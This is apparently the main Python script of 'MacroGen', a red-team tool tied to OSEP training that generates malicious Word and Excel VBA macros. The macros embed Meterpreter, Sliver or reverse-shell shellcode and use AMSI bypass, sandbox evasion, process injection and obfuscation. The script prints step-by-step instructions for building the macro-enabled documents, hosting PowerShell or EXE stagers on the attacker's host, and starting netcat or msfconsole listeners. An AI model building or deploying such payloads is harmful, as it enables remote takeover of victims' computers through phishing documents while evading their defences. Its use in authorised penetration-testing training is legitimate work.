#!/usr/bin/env python3
import argparse
import sys
import os
import shutil
import base64
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# Add the current directory to sys.path so we can import from 'modules'
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from modules.core.utils import console
from modules.payloads import msf, pty_win, sliver
from modules.macros import classic, ps1, exe, wmi, msf_stealth, wmi_stealth_sf, advanced, rev_shell

BANNER = r"""
[bold yellow]  ███╗   ███╗ █████╗  ██████╗██████╗  ██████╗      [/bold yellow][bold blue] ██████╗ ███████╗███╗   ██╗[/bold blue]
[bold yellow]  ████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔═══██╗     [/bold yellow][bold blue]██╔════╝ ██╔════╝████╗  ██║[/bold blue]
[bold yellow]  ██╔████╔██║███████║██║     ██████╔╝██║   ██║     [/bold yellow][bold blue]██║  ███╗█████╗  ██╔██╗ ██║[/bold blue]
[bold yellow]  ██║╚██╔╝██║██╔══██║██║     ██╔══██╗██║   ██║     [/bold yellow][bold blue]██║   ██║██╔══╝  ██║╚██╗██║[/bold blue]
[bold yellow]  ██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║╚██████╔╝     [/bold yellow][bold blue]╚██████╔╝███████╗██║ ╚████║[/bold blue]
[bold yellow]  ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝      [/bold yellow][bold blue] ╚═════╝ ╚══════╝╚═╝  ╚═══╝[/bold blue]
[bold cyan]                               --- OSEP MACRO GENERATOR ---[/bold cyan]
[bold black]                         Developed by: q3alique | Version: 2.1 (WMI-SF Support)[/bold black]
"""

def main():
    cols, rows = shutil.get_terminal_size(fallback=(120, 30))
    console.print(BANNER)
    parser = argparse.ArgumentParser(description="MacroGen - OSEP Macro Generator", add_help=False)
    parser.add_argument("--type", choices=["vba-classic", "vba-ps1", "vba-exe", "vba-wmi", "vba-msf", "vba-wmi-sf", "vba-advanced", "vba-rev"], help="Type of macro to generate")
    parser.add_argument("--payload", choices=["msf", "pty-win", "sliver"], default="msf", help="Payload type (default: msf)")
    parser.add_argument("--msf-payload", default="windows/x64/meterpreter/reverse_https", help="MSF payload")
    parser.add_argument("--lhost", help="LHOST for shellcode")
    parser.add_argument("--lport", help="LPORT for shellcode")
    parser.add_argument("--bin", help="Path to a raw shellcode .bin file")
    parser.add_argument("--remote-url", help="Remote URL for the ps1 script")
    parser.add_argument("--filename", help="Expected filename for sandbox evasion (Optional, only for certain payloads)")
    parser.add_argument("--cols", type=int, default=cols, help=f"PTY columns (default: {cols})")
    parser.add_argument("--rows", type=int, default=rows, help=f"PTY rows (default: {rows})")
    parser.add_argument("--proto", choices=["tcp", "http", "https"], default="tcp", help="Protocol for Sliver (default: tcp)")
    parser.add_argument("-h", "--help", action="store_true", help="Show help")
    
    try:
        args = parser.parse_args()
    except SystemExit:
        sys.exit(1)
    
    if args.help or not args.type:
        table = Table(show_header=False, box=None, padding=(0, 2))
        table.add_column("Option", style="bold yellow", width=35)
        table.add_column("Description", style="white")
        
        table.add_row("\n[bold cyan]Available Macro Types (--type)[/bold cyan]", "")
        table.add_row("1. vba-classic", "Direct shellcode execution within the Office process.")
        table.add_row("2. vba-ps1", "VBA downloads a PowerShell stager for Early Bird Injection.")
        table.add_row("3. vba-exe", "Win32 API downloader for a compiled C# Early Bird runner.")
        table.add_row("4. vba-wmi", "De-chained WMI process creation via PowerShell downloader.")
        table.add_row("5. vba-msf", "Stealthy in-memory macro with XOR+ROT encrypted shellcode.")
        table.add_row("6. vba-wmi-sf", "De-chained WMI process injection (Single-File, No Downloads).")
        table.add_row("7. vba-advanced", "Advanced Injector (AMSI Bypass, Sandbox Evasion, Process Injection).")
        table.add_row("8. vba-rev", "Win32 API Reverse Shell (Direct Connection, No Shellcode).")

        table.add_row("\n[bold cyan]Macro Configuration[/bold cyan]", "")
        table.add_row("--type [green]TYPE[/green]", "Select one of the types described above")
        table.add_row("--payload [green]{msf,pty-win,sliver}[/green]", "Payload type (default: msf)")
        table.add_row("--msf-payload [green]PAYLOAD[/green]", "MSF payload (if --payload msf)")
        table.add_row("--proto [green]{tcp,http,https}[/green]", "Protocol for Sliver stager (if --payload sliver)")
        table.add_row("--lhost [green]LHOST[/green]", "LHOST for shellcode")
        table.add_row("--lport [green]LPORT[/green]", "LPORT for shellcode")
        table.add_row("--bin [green]PATH[/green]", "Path to a raw shellcode .bin file")
        table.add_row("--remote-url [green]URL[/green]", "Remote URL for the stager (required for ps1/exe/wmi)")
        table.add_row("--filename [green]NAME[/green]", "Expected filename for sandbox evasion (Optional)")
        table.add_row("--cols [green]INT[/green]", f"PTY columns (detected: {cols})")
        table.add_row("--rows [green]INT[/green]", f"PTY rows (detected: {rows})")
        
        table.add_row("\n[bold cyan]General[/bold cyan]", "")
        table.add_row("-h, --help", "Show help")
        console.print(table)
        sys.exit(0)

    if not args.bin and (not args.lhost or not args.lport):
        console.print("[bold red][-] Error: --lhost and --lport are required unless --bin is provided.[/bold red]")
        sys.exit(1)

    # Setup output directory
    output_dir = "output"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Helper to construct remote URL
    def get_remote_url(base_url, lhost, filename):
        if not base_url:
            base_url = f"http://{lhost}:80/"
        if not base_url.endswith("/"):
            # If it ends with an extension, assume it's a full URL
            if "." in os.path.basename(base_url):
                return base_url
            base_url += "/"
        return base_url + filename

    # Generate Shellcode
    if args.payload == "pty-win":
        shellcode = pty_win.generate(args.lhost, args.lport, args.cols, args.rows)
    elif args.payload == "sliver":
        shellcode = sliver.generate(args.lhost, args.lport, proto=args.proto)
    else:
        shellcode = msf.generate(args.msf_payload, args.lhost, args.lport, args.bin)
    
    if args.type == "vba-classic":
        output_file = classic.generate(shellcode, output_dir)
        instr_title = "VBA Setup Instructions"
    elif args.type == "vba-msf":
        output_file = msf_stealth.generate(shellcode, output_dir)
        instr_title = "Stealth VBA Setup Instructions"
    elif args.type == "vba-wmi-sf":
        output_file = wmi_stealth_sf.generate(shellcode, output_dir)
        instr_title = "WMI-SF Stealth VBA Setup Instructions"
    elif args.type == "vba-advanced":
        console.print("[bold yellow][*] Generating x64 and x86 shellcode for advanced injector...[/bold yellow]")
        if args.payload == "pty-win":
            # For pty-win, we currently use the same for both or let the generator handle it
            # In a real scenario we'd want specific arch-based shellcode
            shellcode_x64 = pty_win.generate(args.lhost, args.lport, args.cols, args.rows)
            shellcode_x86 = pty_win.generate(args.lhost, args.lport, args.cols, args.rows)
        elif args.payload == "sliver":
            shellcode_x64 = sliver.generate(args.lhost, args.lport, arch="x64", proto=args.proto)
            shellcode_x86 = sliver.generate(args.lhost, args.lport, arch="x86", proto=args.proto)
        else:
            shellcode_x64 = msf.generate(args.msf_payload, args.lhost, args.lport, args.bin)
            msf_payload_x86 = args.msf_payload.replace("/x64/", "/").replace("x64/", "")
            if msf_payload_x86 == args.msf_payload and "windows/x64" not in args.msf_payload:
                # If it wasn't x64, it might already be x86 or not have x64 in path
                pass 
            shellcode_x86 = msf.generate(msf_payload_x86, args.lhost, args.lport, args.bin)
            
        output_file = advanced.generate(shellcode_x64, shellcode_x86, output_dir)
        instr_title = "Advanced Injector VBA Setup Instructions"
    elif args.type == "vba-rev":
        output_file = rev_shell.generate(args.lhost, args.lport, output_dir)
        instr_title = "VBA Reverse Shell Setup Instructions"
    
    if args.type in ["vba-classic", "vba-msf", "vba-wmi-sf", "vba-advanced", "vba-rev"]:
        instr = f"""
[bold cyan]1. Open the file:[/bold cyan] [white]{output_file}[/white]
[bold cyan]2. Copy the entire content.[/bold cyan]
[bold cyan]3. Open Word or Excel.[/bold cyan]
[bold cyan]4. Press[/bold cyan] [bold white]ALT + F11[/bold white] [bold cyan]to open the VBA Editor.[/bold cyan]
[bold cyan]5. Right-click on[/bold cyan] [bold white]ThisDocument[/bold white] [bold cyan](Word) or[/bold cyan] [bold white]ThisWorkbook[/bold white] [bold cyan](Excel).[/bold cyan]
[bold cyan]6. Select[/bold cyan] [bold white]Insert -> Module[/bold white].
[bold cyan]7. Paste the code into the module.[/bold cyan]
[bold cyan]8. Save the document as a macro-enabled format[/bold cyan] ([bold green].docm[/bold green], [bold green].doc[/bold green] [bold cyan]or[/bold cyan] [bold green].xlsm[/bold green]).
"""
        if args.type == "vba-advanced":
            instr += "\n[bold white]Mechanism:[/bold white] Sandbox check (4s sleep), AMSI patch, and cross-process injection.\n"
            instr += "Injects into [bold cyan]explorer.exe[/bold cyan] (x64) or find a [bold cyan]32-bit process[/bold cyan] (x86)."
        
        console.print(Panel(instr.strip(), title=instr_title, border_style="cyan"))
        
    elif args.type == "vba-ps1":
        target_url = get_remote_url(args.remote_url, args.lhost, "run.ps1")
        vba_file, ps1_file = ps1.generate(shellcode, target_url, output_dir)

        serving_instr = f"""
[bold yellow]1. Serve the run.ps1 file:[/bold yellow]
   The file [bold cyan]{ps1_file}[/bold cyan] must be reachable at: [bold green]{target_url}[/bold green]
   You can use a python web server in the output directory:
   [bold white]cd {output_dir} && python3 -m http.server 80[/bold white]

[bold yellow]2. VBA Setup:[/bold yellow]
   Copy the content from [bold cyan]{vba_file}[/bold cyan].
   Paste into a new Module in Word/Excel (ALT + F11).
   Save as .docm, .doc or .xlsm.
"""
        console.print(Panel(serving_instr.strip(), title="Staging Instructions", border_style="cyan"))

    elif args.type == "vba-exe":
        target_url = get_remote_url(args.remote_url, args.lhost, "runner.exe")
        vba_file, exe_path, remote_filename, victim_exe_name = exe.generate(shellcode, target_url, output_dir)
        
        exe_serving_instr = f"""
[bold yellow]1. Serve the EXE Runner:[/bold yellow]
   The file [bold cyan]{exe_path}[/bold cyan] is already named to match your URL!
   Just host it as: [bold green]{target_url}[/bold green]
   Example: [bold white]cd {output_dir} && python3 -m http.server 80[/bold white]

[bold yellow]2. VBA Setup:[/bold yellow]
   Copy the content from [bold cyan]{vba_file}[/bold cyan].
   Paste into a new Module in Word/Excel (ALT + F11).
   Save as .docm, .doc or .xlsm.
   [bold white]Mechanism:[/bold white] The macro downloads [bold cyan]{remote_filename}[/bold cyan] and saves it as [bold green]{victim_exe_name}[/bold green] on the victim.
"""
        console.print(Panel(exe_serving_instr.strip(), title="EXE Staging Instructions", border_style="cyan"))

    elif args.type == "vba-wmi":
        target_url = get_remote_url(args.remote_url, args.lhost, "run.ps1")
        vba_file, ps1_file = wmi.generate(shellcode, target_url, args.filename, output_dir)

        wmi_instr = f"""
[bold yellow]1. Serve the run.ps1 file:[/bold yellow]
   The file [bold cyan]{ps1_file}[/bold cyan] must be reachable at: [bold green]{target_url}[/bold green]

[bold yellow]2. VBA Setup:[/bold yellow]
   Copy the content from [bold cyan]{vba_file}[/bold cyan].
   Paste into a new Module in Word/Excel (ALT + F11).
   
[bold yellow]3. Sandbox Evasion (Optional):[/bold yellow]
   If you provided a [bold cyan]--filename[/bold cyan], the macro will check for it (Note: Current implementation has this check disabled for flexibility).
   
   Save as [bold green].docm[/bold green], [bold green].doc[/bold green] or [bold green].xlsm[/bold green].
   
[bold white]Mechanism:[/bold white] Uses WMI (Win32_Process) to de-chain the process from Word. 
All sensitive strings are obfuscated with a Caesar cipher.
"""
        console.print(Panel(wmi_instr.strip(), title="WMI Staging Instructions", border_style="cyan"))

    # Listener instruction
    lport = args.lport if args.lport else "4444"
    if args.payload == "sliver":
        console.print(sliver.get_sliver_instructions(args.lhost, lport, proto=args.proto))
    elif args.payload == "pty-win" or args.bin:
        console.print("\n[bold yellow][*] Netcat Listener Command (Copy & Paste):[/bold yellow]")
        nc_cmd = f"stty raw -echo; nc -nlvp {lport}; stty sane"
        console.print(f"[bold white]{nc_cmd}[/bold white]\n")
    else:
        if args.type == "vba-advanced":
            console.print("\n[bold yellow][*] MSF Listener Commands (Multi-Arch):[/bold yellow]")
            
            # x64
            console.print("[cyan]x64 Listener:[/cyan]")
            cmd_x64 = f"msfconsole -q -x 'use exploit/multi/handler; set payload {args.msf_payload}; set LHOST {args.lhost}; set LPORT {lport}; exploit'"
            console.print(f"[bold white]{cmd_x64}[/bold white]\n")
            
            # x86
            console.print("[cyan]x86 Listener:[/cyan]")
            msf_payload_x86 = args.msf_payload.replace("/x64/", "/").replace("x64/", "")
            cmd_x86 = f"msfconsole -q -x 'use exploit/multi/handler; set payload {msf_payload_x86}; set LHOST {args.lhost}; set LPORT {lport}; exploit'"
            console.print(f"[bold white]{cmd_x86}[/bold white]\n")
        else:
            console.print("\n[bold yellow][*] MSF Listener Command (Copy & Paste):[/bold yellow]")
            listener_cmd = f"msfconsole -q -x 'use exploit/multi/handler; set payload {args.msf_payload}; set LHOST {args.lhost}; set LPORT {lport}; exploit'"
            console.print(f"[bold white]{listener_cmd}[/bold white]\n")

if __name__ == "__main__":
    main()
